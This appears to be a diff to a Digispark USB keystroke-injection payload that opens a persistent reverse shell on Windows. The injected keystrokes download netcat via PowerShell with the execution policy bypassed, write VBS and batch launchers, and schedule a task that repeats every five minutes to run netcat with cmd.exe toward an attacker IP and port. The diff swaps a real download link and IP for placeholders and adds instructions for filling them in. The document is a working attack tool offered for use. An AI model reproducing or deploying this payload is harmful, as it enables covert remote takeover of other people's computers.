@@ -1,4 +1,6 @@
-This payload is a reverse shell that runs in the background every 5 minutes from 8:20 AM to 3:11 PM. 
+This payload is a reverse shell that runs in the background every 5 minutes from 8:20 AM to 3:11 PM. Replace LINK with netcat direct download link, IP with your listening IP and PORT with a port of your choice. (Ex. 25565).
+
+(Payload runs only once)
 
   #include "DigiKeyboard.h"
 void setup() {
@@ -9,7 +11,7 @@ void setup() {
   DigiKeyboard.print("cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("cd / & mkdir System & cd System & echo (wget 'https://a-21.1fichier.com/c39185452' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
+  DigiKeyboard.print("cd / & mkdir System & cd System & echo (wget 'LINK' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
   DigiKeyboard.print("echo Set WshShell = CreateObject('WScript.Shell') > c.vbs");
@@ -23,11 +25,11 @@ void setup() {
   DigiKeyboard.delay(50);
   DigiKeyboard.print("echo START /MIN a.exe IP PORT -e cmd.exe -d ^& exit > d.bat");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(50);
   DigiKeyboard.print("Schtasks /create /tn TaskSystem /tr C:/System/c.vbs /sc minute /mo 5 /st 08:20 /et 15:11");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
-  DigiKeyboard.print("START /MIN a.exe 192.168.254.73 9999 -e cmd.exe -d & exit");
+  DigiKeyboard.print("d.bat & exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 void loop() {
